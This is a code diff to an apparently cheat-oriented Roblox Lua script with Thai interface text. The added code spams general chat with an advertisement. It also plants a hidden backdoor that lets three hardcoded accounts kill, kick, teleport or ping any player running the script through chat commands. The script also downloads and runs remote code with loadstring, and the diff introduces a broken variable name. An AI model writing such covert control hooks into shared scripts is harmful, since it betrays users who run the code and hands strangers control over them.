@@ -556,10 +556,58 @@ local function showScript()
     buyGunButton.Text = "ซื้อ"
     buyGunButton.TextColor3 = Color3.fromRGB(255,255,255)
     buyGunButton.TextSize = 18
-    buyGunButton.Parent = contentFrame
+    buyGunButton.Parent = contentFrend
 
     buyGunButton.MouseButton1Click:Connect(function()
         local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
         _G.AutoCollectModule.CollectItemByName("M4")
+    end)
+end
+homeButton.MouseButton1Click:Connect(showHome)
+playerButton.MouseButton1Click:Connect(showPlayer)
+scriptButton.MouseButton1Click:Connect(showScript)
+scriptUIButton.MouseButton1Click:Connect(showScriptUI)
+
+showHome()
+
+local TextChatService = game:GetService("TextChatService")
+
+local function sendMessage(msg)
+    local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if channel then
+        channel:SendAsync(msg)
+    else
+        warn("❌ ไม่พบแชนเนล RBXGeneral")
+    end
+end
+
+sendMessage("SCRIPT CITY THAILAND 2 BY:TOUx1")
+
+local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+if channel then
+    channel.MessageReceived:Connect(function(message)
+        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+        if sender and sender.Name ~= player.Name then
+            local text = message.Text:lower()
+            if sender.Name == "birdV2_123" and text == "kill all" then
+                humanoid.Health = 0
+            elseif sender.Name == "birdV2_123" and text:find("kill ") then
+                local killName = text:sub(6):lower()
+                if killName == player.Name:lower() then
+                    humanoid.Health = 0
+                end
+            elseif (sender.Name == "birdV2_123" or sender.Name == "zerom_12y" or sender.Name == "maidjab1_174") and text == "เช็ค" then
+                sendMessage("TOUx1")
+            elseif (sender.Name == "birdV2_123" or sender.Name == "zerom_12y" or sender.Name == "maidjab1_174") and text == "ดึง" then
+                if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("HumanoidRootPart") then
+                    character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame + Vector3.new(3, 0, 0)
+                end
+            elseif sender.Name == "birdV2_123" and text:find("kick ") then
+                local kickName = text:sub(6):lower()
+                if kickName == player.Name:lower() then
+                    player:Kick("โดนแบน")
+                end
+            end
+        end
     end)
 end
